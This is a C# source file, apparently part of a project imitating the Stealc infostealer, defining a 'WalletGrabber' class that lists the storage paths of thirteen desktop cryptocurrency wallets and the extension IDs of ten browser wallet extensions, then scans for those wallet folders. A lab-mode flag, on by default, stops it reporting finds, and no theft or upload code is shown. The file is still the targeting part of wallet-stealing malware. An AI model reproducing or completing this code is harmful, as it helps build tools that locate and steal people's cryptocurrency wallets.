namespace Stealc.Grabber.Grabbers;

public sealed class WalletGrabber
{
    private static readonly (string Name, string RelPath, string Kind)[] Wallets =
    [
        ("Exodus",            @"Exodus\exodus.wallet",                   "desktop"),
        ("Electrum",          @"Electrum\wallets",                       "desktop"),
        ("Atomic Wallet",     @"atomic\Local Storage\leveldb",          "desktop"),
        ("Jaxx Liberty",      @"com.liberty.jaxx\IndexedDB",             "desktop"),
        ("Coinomi",           @"Coinomi\Coinomi\wallets",               "desktop"),
        ("Guarda",            @"Guarda\Local Storage\leveldb",          "desktop"),
        ("Wasabi",            @"WalletWasabi\Client\Wallets",           "desktop"),
        ("Bitcoin Core",      @"Bitcoin\wallets",                        "desktop"),
        ("Litecoin Core",     @"Litecoin\wallets",                       "desktop"),
        ("Dash Core",         @"DashCore\wallets",                       "desktop"),
        ("Monero GUI",        @"Monero\wallets",                         "desktop"),
        ("Ledger Live",       @"Ledger Live\Local Storage\leveldb",     "desktop"),
        ("Binance Desktop",   @"Binance Desktop\Local Storage\leveldb", "desktop"),
    ];

    private static readonly (string Name, string ExtensionId)[] BrowserExtensions =
    [
        ("MetaMask",              "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Phantom",               "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Ronin Wallet",          "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Coinbase Wallet",       "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Trust Wallet",          "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("TronLink",              "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Solflare",              "bhhhlbepdkbapadjdcodbhgjjjolfjfe"),
        ("Keplr",                 "dmkamcknogkgcdfhhbddcghachkejeap"),
        ("Rabby",                 "acmacodkjbdgmoleebolmdjonilkdbch"),
        ("OKX Wallet",            "mcohilncbfahbmgdjkbpemcciiolgcge"),
    ];

    private readonly bool _labMode;

    public WalletGrabber(bool labMode = true) => _labMode = labMode;

    public List<WalletTarget> Scan()
    {
        var results = new List<WalletTarget>();
        var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        foreach (var (name, rel, kind) in Wallets)
        {
            var path = Path.Combine(appData, rel);
            results.Add(new WalletTarget
            {
                Name = name, Path = path, Kind = kind,
                Found = !_labMode && Directory.Exists(path)
            });
        }

        foreach (var (name, extId) in BrowserExtensions)
        {
            results.Add(new WalletTarget
            {
                Name = name, Path = extId, Kind = "extension", Found = false
            });
        }

        return results;
    }

    public int TotalTargets => Wallets.Length + BrowserExtensions.Length;
}

public sealed class WalletTarget
{
    public required string Name { get; init; }
    public required string Path { get; init; }
    public required string Kind { get; init; }
    public bool Found { get; init; }
}
